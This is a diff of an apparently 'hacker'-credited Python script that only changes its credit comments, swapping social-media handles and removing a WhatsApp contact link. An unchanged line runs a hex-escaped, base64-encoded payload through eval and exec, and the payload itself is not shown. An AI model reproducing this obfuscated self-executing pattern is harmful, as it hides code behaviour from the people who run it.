@@ -1,7 +1,9 @@
 #  Coded By Cybok Hacker
-# encryption BY Simple Hacker1
-# Instagram https://www.instagram.com/simple_hacker1/
-# Whatsapp https://api.whatsapp.com/send/?phone=%2B994406437117&text=HI+%2C+Simple_Hacker1++.++I+Need+Encryption++.&app_absent=0
+# script by samay
+# encryption BY Simple Hacker
+# Instagram https://www.instagram.com/simplehacker1/
+# Instagram https://www.instagram.com/vrushabh9423/
+
 
  
 import base64, codecs
@@ -16,9 +18,10 @@ eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
 
 
 #  Coded By Cybok Hacker
-# encryption BY Simple Hacker1
-# Instagram https://www.instagram.com/simple_hacker1/
-# Whatsapp https://api.whatsapp.com/send/?phone=%2B994406437117&text=HI+%2C+Simple_Hacker1++.++I+Need+Encryption++.&app_absent=0
+# script by samay
+# encryption BY Simple Hacker
+# Instagram https://www.instagram.com/simplehacker1/
+# Instagram https://www.instagram.com/vrushabh9423/
 
  
 
